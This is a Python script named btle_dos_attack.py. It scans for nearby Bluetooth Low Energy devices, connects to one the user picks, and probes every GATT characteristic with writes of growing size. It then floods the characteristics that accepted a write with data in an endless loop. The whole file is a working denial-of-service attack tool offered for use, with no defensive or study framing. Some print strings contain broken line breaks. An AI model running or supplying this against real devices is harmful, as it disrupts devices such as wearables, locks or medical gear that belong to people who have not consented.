
# btle_dos_attack.py

import asyncio
from bleak import BleakScanner, BleakClient

# Callback function triggered when a BLE device is detected
def detection_callback(device, advertisement_data):
    """Callback for detected devices during scanning."""
    print(f"Detected device: {device.name} ({device.address})")

async def run():
    """Main asynchronous function to handle BLE operations."""
    
    # Initialize the scanner with the detection callback
    scanner = BleakScanner(detection_callback=detection_callback)
    
    # Start scanning for devices
    await scanner.start()
    await asyncio.sleep(10)  # Scan for 10 seconds
    await scanner.stop()
    
    # Retrieve and list the discovered devices
    devices = await scanner.get_discovered_devices()
    for i, device in enumerate(devices):
        print(f"{i + 1}. {device.name} ({device.address})")
    
    # Prompt user to choose a device to connect to
    choice = int(input("Enter the number of the device you want to connect to: ")) - 1
    address = devices[choice].address
    print(f"Attempting to connect to {devices[choice].name} ({devices[choice].address})")
    
    # Dictionary to store successful data formats for each characteristic
    successful_data_formats = {}

    # Connect to the selected BLE device
    async with BleakClient(address) as client:
        
        # Fetch all services of the connected device
        services = await client.get_services()

        # Loop through each service's characteristics
        for service in services:
            for char in service.characteristics:
                print(f"Testing {char.uuid}")

                # Try writing data of various sizes to the characteristic
                for size in range(20, 810, 10):
                    data_packet = ''.join([str(i % 10) for i in range(size)]).encode()
                    format_name = f"string_numbers_{size}_bytes"
                    try:
                        await client.write_gatt_char(char.uuid, data_packet)
                        print(f"Successful write with {format_name} to {char.uuid}")
                        if char.uuid not in successful_data_formats:
                            successful_data_formats[char.uuid] = format_name
                    except Exception as e:
                        print(f"Failed {format_name} write to {char.uuid}. Reason: {str(e)}")

        # Display the successful UUIDs and their data formats
        print("
Successful UUIDs and their formats:")
        for uuid, format_name in successful_data_formats.items():
            print(f"UUID: {uuid} | Format: {format_name}")
        
        # Continuous loop to keep writing data to the successful UUIDs
        print("
Starting continuous write loop...
")
        try:
            while True:
                for uuid, format_name in successful_data_formats.items():
                    size = int(format_name.split("_")[2])
                    data_packet = ''.join([str(i % 10) for i in range(size)]).encode()
                    await client.write_gatt_char(uuid, data_packet)
                    print(f"Sent data ({format_name}) to {uuid}")
        except KeyboardInterrupt:
            print("
Stopped writing due to keyboard interruption")

# Initialize and start the asynchronous event loop
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run())
